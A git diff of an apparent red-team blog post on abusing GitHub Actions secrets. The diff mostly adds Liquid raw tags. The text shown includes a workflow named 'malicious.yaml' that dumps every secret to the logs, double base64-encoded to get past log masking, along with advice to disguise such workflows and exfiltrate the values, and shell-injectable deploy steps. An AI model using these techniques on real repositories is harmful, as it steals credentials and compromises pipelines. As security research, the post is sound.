@@ -5,7 +5,6 @@ author: nopcorn
 description: GitHub Actions secrets are designed to protect your credentials, but the same properties that make them secure make them a versatile tool for attackers.
 summary: GitHub Actions secrets are designed to protect your credentials, but the same properties that make them secure make them a versatile tool for attackers.
 tags: [cicd, github, github_token, workflow, redteam, actions, github_actions, secrets]
-liquid: false
 ---
 
 > - Anyone with write access to a repo can overwrite any secret, including environment secrets protected by required reviewers
@@ -38,6 +37,7 @@ The obvious problem is noise. Blindly overwriting a secret you don't know the va
 
 Consider this vulnerable workflow step:
 
+{% raw %}
 ```yaml
 - name: Deploy to production
   run: |
@@ -45,6 +45,7 @@ Consider this vulnerable workflow step:
     chmod 600 /tmp/deploy_key
     ssh -i /tmp/deploy_key -o StrictHostKeyChecking=no deploy@prod.example.com "deploy_script.sh"
 ```
+{% endraw %}
 
 The direct interpolation of `SSH_PRIVATE_KEY` makes this vulnerable to shell injection. But to exploit it cleanly, we first need to know the secret's current value so we can preserve it in our payload. That means we need to figure out where the secret lives: is it an organization secret, a repository secret, or an environment secret? The answer determines whether we can read the original value and whether we can override it at a different scope.
 
@@ -56,6 +57,7 @@ gh secret list --repo <org>/<repo> --env <env>
 
 Assuming it is an organization secret, we can dump its value by pushing a throwaway workflow to a feature branch. Organization secrets are passed to all workflows in repositories that have access to them, regardless of whether any job explicitly references the secret by name.
 
+{% raw %}
 ```yaml
 # .github/workflows/malicious.yaml (pushed to a feature branch)
 name: debug
@@ -67,6 +69,7 @@ jobs:
       - name: nothing to see here
         run: echo '${{ toJSON(secrets) }}' | base64 | base64 # bypass log masking
 ```
+{% endraw %}
 
 This writes all available secrets to the workflow logs and bypasses GitHub's secret masking. In a real engagement you would blend the workflow name and step names into something ordinary, and you would probably exfiltrate the values to a server you control rather than leaving them in the logs.
 
@@ -97,13 +100,15 @@ This shifts the attacker's goal. Instead of exploiting a workflow that already e
 
 Consider a PR that adds a step like this:
 
+{% raw %}
 ```yaml
 - name: Add API key to local config
   env:
-    API_KEY: $\{{ secrets.API_KEY }}
+    API_KEY: ${{ secrets.API_KEY }}
   run: |
     sed "s/PLACEHOLDER_API_KEY/$API_KEY/" settings.conf
 ```
+{% endraw %}
 
 This looks fine. The secret is loaded as an environment variable, so shell injection is off the table. It uses `sed` to drop a sensitive API key into a settings file. A reviewer who has read GitHub's guidance on secrets will see the `env` block, nod approvingly, and hit approve.
 
